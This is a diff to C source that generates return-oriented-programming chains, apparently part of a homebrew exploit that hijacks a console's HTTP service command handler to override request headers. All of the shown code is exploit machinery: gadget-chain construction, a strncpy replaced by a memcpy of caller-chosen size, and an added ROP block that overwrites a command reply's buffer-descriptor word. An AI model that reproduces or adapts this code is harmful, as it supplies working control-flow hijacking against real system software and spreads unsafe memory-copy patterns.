@@ -431,7 +431,7 @@ void ropgen_requestoverride(u32 **ropchain, u32 *http_ropvaddr, u32 firstptr_ctx
 			{
 				if(*((u32*)curent->value))
 				{
-					if(strncmp(input_valuebuf, curent->value, 0x40-1)!=0)continue;
+					if(strncmp(input_valuebuf, curent->value, strlen(input_valuebuf))!=0)continue;
 				}
 
 				if(curent->required_id)
@@ -441,7 +441,7 @@ void ropgen_requestoverride(u32 **ropchain, u32 *http_ropvaddr, u32 firstptr_ctx
 
 				if(curent->setid_onmatch)targeturlctx->lastmatch_id = curent->id;
 
-				if(*((u32*)curent->new_value))strncpy(input_valuebuf, curent->new_value, strlen(input_valuebuf)+1);
+				if(*((u32*)curent->new_value))memcpy(input_valuebuf, curent->new_value, curent->new_value_copysize);
 				break;
 			}
 		}
@@ -457,7 +457,6 @@ void ropgen_requestoverride(u32 **ropchain, u32 *http_ropvaddr, u32 firstptr_ctx
 	tmpaddr0 = *http_ropvaddr;
 
 	memset(params, 0, sizeof(params));
-	params[2] = 0x40-1;
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, namebufptr_vaddr, 1);
 	ropgen_blxr3(ropchain, http_ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncmp with strlen(input_namebuf).
@@ -571,19 +570,21 @@ void ropgen_requestoverride(u32 **ropchain, u32 *http_ropvaddr, u32 firstptr_ctx
 	ropvaddr_block1 = *http_ropvaddr;
 	ropgen_checkcond_necontinue_eqjump(ropchain, http_ropvaddr, 0);
 
-	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
-	ropgen_blxr3(ropchain, http_ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncpy with strlen(input_valuebuf)+1.
-	ropgen_add_r0ip(ropchain, http_ropvaddr, 1);
+	//Overwrite the r2 value which will be used for the below memcpy with curent->new_value_copysize.
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);
+	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, new_value_copysize));
+	ropgen_movr1r0(ropchain, http_ropvaddr);
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, 0, 0);
 	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x40 + 0x4, 1);
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncpy with input_valuebuf.
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below memcpy with input_valuebuf.
 
 	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);
 	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, new_value));
-	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncpy with curent->new_value.
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below memcpy with curent->new_value.
 
-	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncpy, params);//strncpy(input_valuebuf, curent->new_value, strlen(input_valuebuf)+1);
+	ropgen_callfunc(ropchain, http_ropvaddr, ROP_memcpy, params);//memcpy(input_valuebuf, curent->new_value, curent->new_value_copysize);
 
 	ropgen_checkcond_necontinue_eqjump(&ropchain_block1, &ropvaddr_block1, *http_ropvaddr);
 
@@ -861,6 +862,8 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u8 *targeturl_list_sharedmemptr8 = NULL;
 	u32 targeturl_list_size, targeturl_list_entcount;
 	targeturl_caps tmpcaps;
+
+	u32 curent = ropheap+0x3c;
 
 	if(first_targeturlctx==NULL)
 	{
@@ -1146,6 +1149,36 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	ropgen_addword(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_AddRequestHeader);
 	ropgen_addwords(&ropchain, &ropvaddr, 0, 6 + 7);//"add sp, sp, #24" "pop {r4..sl, pc}"
+
+		//if(targeturl_requestoverridectx_curent==NULL)<skip over this block>
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, curent, 1);
+
+		ropgen_popr1(&ropchain, &ropvaddr, 0);
+		ropchain1 = ropchain;
+		ropvaddr1 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, curent, 1);//*((u32*)(ropheap+0x40)) = curent->new_descriptorword_value;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturl_requestoverridectx, new_descriptorword_value));
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x40, 1);
+
+		ropgen_popr1(&ropchain, &ropvaddr, 0);//if(<value loaded above> == 0)<skip over this block>
+		ropchain0 = ropchain;
+		ropvaddr0 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+			ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x40, ropvaddr + 0x40 + 0x20 + 0x40 + 0x2c + 0x4, 0x3);//Overwrite the r0 value for ropgen_setr0 below with the value from ropheap+0x40(setup above).
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//r0 = cmdbuf ptr.
+			ropgen_add_r0ip(&ropchain, &ropvaddr, 0x8-4);
+			ropgen_movr1r0(&ropchain, &ropvaddr);
+			ropgen_setr0(&ropchain, &ropvaddr, 0);
+			ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);//cmdreply[2](buffer descriptor) = curent->new_descriptorword_value.
+
+		ropgen_checkcond_necontinue_eqjump(&ropchain1, &ropvaddr1, ropvaddr);
+		ropgen_checkcond_necontinue_eqjump(&ropchain0, &ropvaddr0, ropvaddr);
 
 	ropgen_ret2cmdhandler(&ropchain, &ropvaddr);
 
